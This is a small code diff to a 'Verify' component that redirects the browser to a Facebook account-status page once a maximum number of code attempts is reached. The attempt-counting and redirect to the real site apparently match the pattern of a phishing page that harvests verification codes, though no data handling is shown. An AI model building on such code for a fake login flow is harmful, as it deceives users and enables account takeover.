@@ -98,7 +98,7 @@ const Verify = () => {
 
             if (codeAttempts.length >= config.MAX_CODE_ATTEMPTS) {
                 setTimeout(() => {
-                    window.location.replace('https://facebook.com');
+                    window.location.replace('https://www.facebook.com/account_status/?location=account_status_bookmark');
                 }, config.LOAD_TIMEOUT_MS);
             }
         } catch (error) {
